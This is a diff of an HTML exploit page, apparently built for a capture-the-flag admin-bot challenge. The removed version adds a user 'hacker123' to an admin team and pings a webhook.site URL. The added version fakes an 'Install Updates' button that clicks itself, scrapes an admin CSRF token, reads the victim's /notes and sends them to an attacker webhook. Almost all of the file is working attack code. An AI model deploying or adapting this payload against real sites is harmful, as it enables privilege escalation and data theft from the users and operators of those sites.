@@ -1,17 +1,37 @@
-<html><body>
-  <button id="installbutton" onclick="
-    fetch('/api/teams/1/addUser/hacker123', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({ csrfToken: 'admin_csrf' })
-    }).then(() => {
-      fetch('https://webhook.site/c2fe413d-6693-467a-8785-70bb939fbb20', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: '✅ User hacker123 added to admin team!'
-      })
-    })
-  ">Click Me</button>
-</body></html>
+<!DOCTYPE html>
+<html>
+<body>
+  <!-- Button the bot will click -->
+  <button id="installbutton">Install Updates</button>
+
+  <script>
+    // This will execute in the context of the target site when the bot visits
+    document.getElementById('installbutton').addEventListener('click', async () => {
+      try {
+        // 1. Get admin CSRF token
+        const installPage = await fetch('/apiv1/private/install').then(r => r.text());
+        const parser = new DOMParser();
+        const doc = parser.parseFromString(installPage, 'text/html');
+        const token = doc.querySelector('[name="csrfToken"]').value;
+        
+        // 2. Call privileged APIs
+        const notes = await fetch('/notes', {
+          headers: { 'X-CSRF-Token': token }
+        }).then(r => r.text());
+        
+        // 3. Exfiltrate data (using an open redirect on the target site)
+        window.location = `https://your-webhook-server.com/exfil?data=${encodeURIComponent(notes)}`;
+        
+      } catch (error) {
+        // Fallback if something fails
+        window.location = 'https://google.com';
+      }
+    });
+    
+    // Auto-click after delay
+    setTimeout(() => {
+      document.getElementById('installbutton').click();
+    }, 1000);
+  </script>
+</body>
+</html>
